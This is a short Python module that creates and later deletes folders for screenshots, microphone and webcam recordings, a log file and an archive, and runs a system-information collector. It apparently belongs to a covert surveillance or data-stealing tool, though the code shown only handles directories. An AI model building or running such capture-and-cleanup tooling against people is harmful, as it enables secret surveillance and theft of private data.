import os
import shutil
from settings import (path, logs_file, microphone,
                      screenshots, webcamera, archive_name)
from src.system_info import SysInfo

sys = SysInfo()

def make_dir():
    if not os.path.exists(path):
        os.mkdir(path)
    if not os.path.exists(path + screenshots):
        os.mkdir(path + screenshots)
    if not os.path.exists(path + microphone):
        os.mkdir(path + microphone)
    if not os.path.exists(path + webcamera):
        os.mkdir(path + webcamera)

    with open(path + logs_file, 'w'):
        sys.run()

def remove_dir():
    if os.path.exists(path):
        shutil.rmtree(path)
    if os.path.exists(archive_name):
        shutil.rmtree(archive_name)
